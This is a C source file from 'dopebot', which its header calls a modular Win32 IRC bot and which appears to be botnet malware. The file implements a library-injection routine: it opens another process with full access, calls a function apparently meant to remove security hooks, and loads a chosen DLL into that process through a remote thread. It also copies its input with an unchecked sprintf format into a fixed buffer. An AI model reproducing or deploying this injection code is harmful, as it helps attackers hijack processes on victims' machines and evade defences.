/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_INJECTION
#include "bot.h"

//Inject Library
bool inject_library(char *szProcess, char *szLibPath)
{
	char szDLLPath[256];
	DWORD dwBytesWritten, dwThreadID;
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE lpModule;
	LPVOID lpBuffer;

#ifndef NO_DEBUG
		printf("[DEBUG] Injecting library, inject_library()...\n");
#endif

#ifndef NO_UNHOOK
		unhook_functions();
#endif

		sprintf(szDLLPath, szLibPath);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_pid(szProcess));
	if (hProcess == NULL) return FALSE;
		lpModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA");
		lpBuffer = xVirtualAllocEx(hProcess, NULL, sizeof(szDLLPath), MEM_COMMIT, PAGE_READWRITE);
	if (!lpBuffer) return FALSE;
	if (!WriteProcessMemory(hProcess, lpBuffer, szDLLPath, sizeof(szDLLPath), &dwBytesWritten)) return FALSE;
		hThread = xCreateRemoteThread(hProcess, NULL, 0, lpModule, lpBuffer, 0, &dwThreadID);
	if (!hThread) return FALSE;
		WaitForSingleObject(hThread, 1000);
		xVirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}
#endif